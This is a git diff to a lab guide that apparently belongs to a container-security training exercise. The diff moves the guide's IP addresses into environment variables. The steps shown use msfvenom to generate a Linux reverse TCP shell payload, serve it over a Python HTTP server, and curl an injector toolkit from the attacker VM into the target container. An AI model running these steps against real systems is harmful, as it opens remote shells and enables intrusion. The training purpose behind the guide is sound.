@@ -6,6 +6,12 @@
 docker exec -it sysmon bash
 ```
 
+* Set the VM IPs in the environment replacing the values with the correct IPs
+
+```bash
+export STUDENTVMIP=192.168.x.y && export CTFVMIP=192.168.w.z
+```
+
 ![docker exec into sysmon](images/sysmon-access.png)
 
 * Check for existing capabilities by running `capsh --print`
@@ -20,12 +26,12 @@ docker exec -it sysmon bash
 
 ## Steps to attack
 
-* Generate reverse shell payload using metasploit's `msfvenom` program. Replace the `192.168.56.3` with student vm IP address.
+* Generate reverse shell payload using metasploit's `msfvenom` program. 
 
 ```bash
 cd /home/student/linux-injector
 
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f raw -o payload.bin
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$STUDENTVMIP LPORT=4444 -f raw -o payload.bin
 ```
 
 ![msfvenom generate](images/sysmon-msfvenom-generate.png)
@@ -40,11 +46,10 @@ python -m SimpleHTTPServer 8002
 
 ![start python server](images/sysmon-start-python-server.png)
 
-* Download the payload in the ctf vm container. Run the below command in the CTF vm and inside the `sysmon` container. Ensure you replace the `192.168.56.3` with your student vm IP
-
+* Download the payload in the ctf vm container. Run the below command in the CTF vm and inside the `sysmon` container.
 
 ```bash
-curl -o linux-injector.tar.gz http://192.168.56.3:8002/linux-injector.tar.gz
+curl -o linux-injector.tar.gz http://$STUDENTVMIP:8002/linux-injector.tar.gz
 tar xzf linux-injector.tar.gz
 cd linux-injector
 chmod 755 injector
